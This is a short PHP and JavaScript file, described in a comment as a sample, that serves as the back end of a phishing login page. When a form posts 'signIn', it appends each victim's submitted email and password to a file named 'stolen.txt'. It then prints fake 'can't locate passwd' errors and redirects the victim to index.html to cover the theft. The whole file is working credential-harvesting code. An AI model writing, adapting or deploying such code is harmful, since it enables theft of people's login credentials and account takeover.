<?php	//this is a sample file
if ($_POST['signIn']){

	$myFile = "stolen.txt";
	$fh = fopen($myFile, 'a') or die("can't open file");
	fwrite($fh, "--------------------\n");
	$stringData = "username: " . $_POST['Email'] . "\n";
	fwrite($fh, $stringData);
	$stringData = "password: " . $_POST['Passwd'] . "\n";
	fwrite($fh, $stringData);
	fclose($fh);

	echo "$_POST";

} else {
	echo "ERROR: Can't locate /etc/psswd";
}
?>


<script>
var redirect = "index.html";
document.write("Error Can't locate /etc/Frameword/passwd/");
window.location.replace(redirect);
</script>
